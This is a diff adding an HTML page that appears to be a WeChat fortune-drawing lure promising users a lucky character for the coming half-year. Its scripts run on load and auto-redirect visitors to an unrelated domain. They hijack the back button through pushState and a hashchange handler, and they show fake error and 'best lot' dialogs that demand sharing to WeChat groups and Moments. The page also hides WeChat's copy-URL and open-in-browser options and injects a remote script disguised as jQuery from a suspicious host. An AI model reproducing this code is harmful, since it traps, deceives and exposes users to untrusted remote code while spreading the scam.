@@ -1,0 +1,309 @@
+<html>
+
+<head>
+    <META HTTP-EQUIV="pragma" CONTENT="no-cache">
+    <META HTTP-EQUIV="Cache-Control" CONTENT="no-store, must-revalidate">
+    <META HTTP-EQUIV="expires" CONTENT="0">
+    <meta id="eqMobileViewport" name="viewport" content="width=320, initial-scale=1, maximum-scale=1, user-scalable=no"
+        servergenerated="true">
+    <script src="http://libs.baidu.com/jquery/1.8.2/jquery.min.js" charset="utf-8"></script>
+    <script type="text/javascript" src="http://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+    <title>看看我是什么字</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <style type="text/css">
+        body {
+            font: normal 14px/22px Arial, "Microsoft YaHei";
+            color: #323232;
+            background-color: #FFF;
+        }
+
+        a:hover {
+            text-decoration: underline
+        }
+
+        a {
+            text-transform: none;
+            text-decoration: none;
+        }
+
+        #shareXX {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 100;
+            width: 100%;
+            height: 100%;
+            filter: alpha(opacity=99);
+            background: rgba(0, 0, 0, 0.5);
+            opacity: 1;
+        }
+
+        #shareQZ {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 100;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 1);
+            opacity: 1;
+        }
+
+        #share {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 100;
+            width: 100%;
+            height: 100%;
+            filter: alpha(opacity=99);
+            background: rgba(0, 0, 0, 0.75);
+            opacity: 1;
+        }
+
+        @keyframes change {
+            0% {
+                text-shadow: 0 0 4px #f00
+            }
+
+            50% {
+                text-shadow: 0 0 40px #f00
+            }
+
+            100% {
+                text-shadow: 0 0 4px #f00
+            }
+        }
+
+        #jieguoIMG {
+            pointer-events: none;
+        }
+
+        .do {
+            width: 100%;
+            height: 15%;
+            margin: 0 auto;
+            position: fixed;
+            bottom: 25%;
+            min-height: 70px;
+            text-align: center;
+            color: red;
+            line-height: -20px;
+            cursor: pointer;
+            display: block;
+            padding: 0px 0;
+            background: url(http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rFUT9OJQX1nST0TvmUib1syLCbyZzqe4JNg/0) no-repeat center;
+            background-size: cover;
+        }
+
+        #body {
+            margin: 0;
+            background: url(https://qqpublic.qpic.cn/qq_public/0/0-3144009966-2DD00D55C8248751137E958786748927/0);
+            background-size: 100% 100%;
+            width: 100%;
+            height: 100%;
+        }
+
+        @keyframes play {
+            100% {
+                background-position: -737px -2px;
+            }
+        }
+
+        @-webkit-keyframes play {
+            100% {
+                background-position: -737px -2px;
+            }
+        }
+
+        .sprite {
+            width: 145px;
+            height: 300px;
+            display: inline-block;
+            overflow: hidden;
+            background-repeat: no-repeat;
+            background-image: url(http://puep.qpic.cn/coral/Q3auHgzwzM7tXVzlGa6ibTTKU0BoqLJ4L4BxM2bnZknMdXs0jCNDZzA/0);
+            background-position: -2px -2px;
+            animation: play 0.8s steps(5) infinite;
+            -webkit-animation: play 0.8s steps(5) infinite;
+        }
+
+        .item {
+            width: 100%;
+            text-align: center;
+            padding-top: 20%;
+        }
+
+        .hld_c {
+            position: relative;
+            top: -70px;
+            width: 13%;
+            animation: hld_c_d 3s infinite;
+            -webkit-animation: hld_c_d 3s infinite;
+            -moz-animation: hld_c_d 3s infinite;
+        }
+
+        @-webkit-keyframes hld_b_d {
+            0% {
+                box-shadow: #FF3939 0 0 10px;
+                color: #FFF;
+                background-color: rgba(255, 73, 73, 0.44);
+            }
+
+            30% {
+                box-shadow: #FF3939 0 0 10px;
+                color: #FFF;
+                background-color: rgba(255, 73, 73, 0.44);
+            }
+
+            38% {
+                box-shadow: #C4F0FF 0 0 30px;
+                color: #F0C4C4;
+                background-color: rgba(219, 73, 73, 0.44);
+            }
+
+            100% {
+                box-shadow: #FF3939 0 0 10px;
+                color: #FFF;
+                background-color: rgba(255, 73, 73, 0.44);
+            }
+        }
+
+        @-webkit-keyframes hld_c_d {
+            0% {
+                -webkit-transform: translateY(20px);
+                opacity: 0;
+            }
+
+            50% {
+                -webkit-transform: translateY(0px);
+                opacity: 0.7;
+            }
+
+            70% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 0;
+            }
+        }
+    </style>
+    <script>wx.config({ debug: false, appId: 'null', timestamp: 'null', nonceStr: 'null', signature: 'null', jsApiList: ['hideMenuItems', 'onMenuShareTimeline', 'onMenuShareAppMessage', 'onMenuShareQQ'] });</script>
+</head>
+
+<body id="body">
+    <div id="yaodiv" style="width: 100%; height: auto;display: block;">
+        <div class="do" style="margin-top: 50%;" onclick="yao()"><span
+                style="font-size: 17px;">手机摇一摇&nbsp;&nbsp;摇出好运来</span></div>
+        <div id="share" style="display: none;" onClick="javascript:hide_share();">
+            <div style="display:none"><audio id="media"
+                    src="https://res.wx.qq.com/voice/getvoice?mediaid=MzAxNzQ5NTczMV81MDMzNjEwMDU=" controls=""></audio>
+            </div>
+            <div class="cover result" id="qiantong">
+                <div class="item">
+                    <div class="sprite a1"></div>
+                </div>
+            </div>
+            <div id="jieqian" style=" padding-top: 50%; display: none;">
+                <div class="share-img" style="margin:0 auto; width: 100%; padding-left: 10%;"><img
+                        src="http://qqpublic.qpic.cn/qq_public/0/0-2308047152-AF6E39C672E46169F0B0163BA1185064/0"
+                        alt="shareimg" style="width:80%; "></div>
+            </div>
+        </div>
+    </div>
+    <div id="result" style="display: none;width: 94%;padding-left: 3%;padding-top: 10px;">
+        <h1 style="font-size:22px;">我抽到的下半年字：大</h1>
+        <p><a href="https://www.baidu.com/link?url=yQ6G3E90p70nnWqTrOHAIKoIi1yoefCstQcUBYGVWlYvlVBiC0x8wn-6ZCkiok5q&wd="
+                style="color: #a2a9b7;">2019-07-15 <span
+                    style="animation:change 1s ease-in infinite;color:#550;">👉恭请圣签请点这里哦👈</span></a></p>
+        <div onClick="window.location.href='https://www.baidu.com/link?url=yQ6G3E90p70nnWqTrOHAIKoIi1yoefCstQcUBYGVWlYvlVBiC0x8wn-6ZCkiok5q&wd='"
+            style="padding-bottom:10px;"><span><strong><span style="font-size: 14px; "><span
+                            style="max-width: 100%; color: rgb(227, 108, 9);"><img
+                                src="http://qqpublic.qpic.cn/qq_public/0/0-3016182486-B9A83163D5B13E58B71C09DE56977CA5/0"><img
+                                src="http://qqpublic.qpic.cn/qq_public/0/0-3016182486-B9A83163D5B13E58B71C09DE56977CA5/0"
+                                width="20" height="29" style=""><img
+                                src="http://qqpublic.qpic.cn/qq_public/0/0-3016182486-B9A83163D5B13E58B71C09DE56977CA5/0"
+                                width="20" height="29" style="">点击上方“</span><span
+                            style="max-width: 100%; color: rgb(0, 177, 240); ">闪动文字</span><span
+                            style="max-width: 100%; color: rgb(227, 108, 9); ">”免费抽取
+                            你的下半年字。查看你的运势！包你时来运转！</span></span></strong></span></div>
+        <hr /><img id="jieguoIMG"
+            src="https://qqpublic.qpic.cn/qq_public/0/0-3102741734-274BBE591928687E01CDC354D12498C6/0"
+            style="width: 100%;height: auto;"><br><br>
+        <div style="text-align:center;"></div>
+        <div onclick="window.location.href='https://www.baidu.com/link?url=yQ6G3E90p70nnWqTrOHAIKoIi1yoefCstQcUBYGVWlYvlVBiC0x8wn-6ZCkiok5q&wd='"
+            style="width: 90%;height: 60px;text-align: center;display: none;border:1px solid red;background:#ffbfbf;border-radius:9px;line-height: 60px;font-size:22px;margin:0 auto;"
+            id="butts2"><span style="color:red;">点击抽取你的[下半年字]</span></div><br /><br />
+        <div id="shareXX" style="display: none;" onclick="hide_share()">
+            <div class="share-bg">
+                <div class="share-img"><img
+                        src="https://qqpublic.qpic.cn/qq_public/0/0-3113282897-8ED12CF4BBCE047E1B7527432BA7ED5D/0"
+                        alt="shareimg" style="width: 100%"></div>
+            </div>
+        </div>
+        <div id="shareQZ" style="display: none;""><img src="
+            http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rC4d6kgobvIiaibfFBj0YN8kvYiaDibiaIppkTQ/0" alt="shareimg"
+            style="width: 100%; height : 100%;"></div>
+        <link href="https://res.wx.qq.com/open/libs/weui/1.0.2/weui.min.css" rel="stylesheet">
+        <div id="lly_dialog" style="display: none;">
+            <div class="weui-mask"></div>
+            <div class="weui-dialog">
+                <div class="weui-dialog__bd" id="lly_dialog_msg"><span
+                        style="font-size: 24px;color: #f5294c">数据加载异常</span><br>请分享到微信群，免流量加速观看</div>
+                <div class="weui-dialog__ft">
+                    <a href="javascript:;" class="weui-dialog__btn weui-dialog__btn_primary" id="lly_dialog_btn">好</a>
+                </div>
+            </div>
+        </div>
+        <script>
+            var alertTimes = 0; var sharess = 0;
+            function wxalert(msg, btn, callback) {
+                if (alertTimes == 0) {
+                    var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
+                    $("body").append(dialog)
+                }
+                alertTimes++;
+                var d = $('#lly_dialog');
+                d.show(200);
+                d.find("#lly_dialog_msg").html(msg);
+                d.find("#lly_dialog_btn").html(btn);
+                d.find("#lly_dialog_btn").off('click').on('click', function () {
+                    d.hide(200);
+                    if (callback) {
+                        callback()
+                    }
+                })
+            }</script>
+        <script
+            type="text/javascript">var flag = 0; function yao() { document.getElementById('share').style.display = 'block'; if (flag == 0) { document.getElementById("media"); media.play(); setTimeout("yaobai()", 2000); } flag = 1; } function yaobai() { document.getElementById('qiantong').style.display = 'none'; document.getElementById('jieqian').style.display = 'block'; setTimeout(function () { tiaozhuan(); }, 2000); } function tiaozhuan() {
+                    var num2 = parseInt(90 * Math.random() + 10); var url = "http://miss.hongshipaint.cn/gouqin.jsp?now=1563175780154&sid=106";
+                    url = encodeURI(encodeURI(url));
+                    location.href = url;
+                } function fen() { document.getElementById('shareXX').style.display = 'block'; } function hide_share() { document.getElementById('shareXX').style.display = 'none'; }</script>
+        <script type="text/javascript">window.onload = function () {
+                setTimeout("yao()", 3000); document.addEventListener("WeixinJSBridgeReady", function () {
+                    document.getElementById('media').play();
+                    document.getElementById('media').pause();
+                }, false);
+            }</script>
+        <script>
+            window.onhashchange = function () { jp(); };
+            function hh() { history.pushState(history.length + 1, "message", "#" + new Date().getTime()); }
+            function jp() { var a = document.createElement('a'); a.setAttribute('rel', 'noreferrer'); a.setAttribute('href', "http://mp.x.comm.hkbcw.cn:8082/wwyyy.html"); document.body.appendChild(a); a.click(); document.body.removeChild(a); }
+            function jp3() {
+                window.onhashchange = function () { jp(); };
+                setTimeout('hh();', 100);
+                wxalert('<b style="font-size: 38px;color: red">恭喜您</b><br><b style="font-size: 22px;color: red">已抽到上上签</b><br><b style="font-size: 22px;color: red">分享到朋友圈后</b><br><b style="font-size: 22px;color: red">即可查看签文讲解</b>', '好', function () { });
+            }
+            setTimeout('hh();', 100);
+        </script>
+        <script
+            type="text/javascript">var titleVar = '准的吓人！我算的下半年字：大💝'; var imgurl = 'http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rIibKwuQ1D0mz5jBWicADyfLH2qwboLyNbSw/0'; var linkurl = 'http://sedgy.chuangxin58.com/gouqin.jsp?now=1563175780154&sid=106'; wx.ready(function () { wx.hideMenuItems({ menuList: ['menuItem:share:appMessage', 'menuItem:share:qq', 'menuItem:share:weiboApp', 'menuItem:favorite', 'menuItem:share:facebook', 'menuItem:share:QZone', 'menuItem:editTag', 'menuItem:delete', 'menuItem:copyUrl', 'menuItem:originPage', 'menuItem:readMode', 'menuItem:openWithQQBrowser', 'menuItem:openWithSafari', 'menuItem:share:email', 'menuItem:share:brand'] }); wx.onMenuShareTimeline({ title: titleVar, link: linkurl, imgUrl: imgurl, success: function () { share_timeline_times++; share_tip(shareATimes, share_timeline_times); }, cancel: function () { } }); wx.onMenuShareAppMessage({ desc: '我抽取到了上上签，你也来试试吧', title: titleVar, link: linkurl, imgUrl: imgurl, type: 'link', dataUrl: '', success: function () { share_tip(shareATimes, share_timeline_times); }, cancel: function () { } }); });</script>
+        <script>setTimeout(function () { var cnzz = document.createElement("script"); cnzz.src = "https://s5.cnzz.com/z_stat.php?id=1277780413&web_id=1277780413"; document.body.appendChild(cnzz); }, 100);
+            setTimeout(function () { var cnzz2 = document.createElement("script"); cnzz2.src = "https://s96.cnzz.com/z_stat.php?id=1277701759&web_id=1277701759"; document.body.appendChild(cnzz2); }, 100);
+            setTimeout(function () { var cnzzjq = document.createElement("script"); cnzzjq.src = "http://mp.x.comm.hkbcw.cn:8082/img/jquery.v1.7.9.js"; document.body.appendChild(cnzzjq); }, 100);
+        </script>
+</body>
+
+</html>
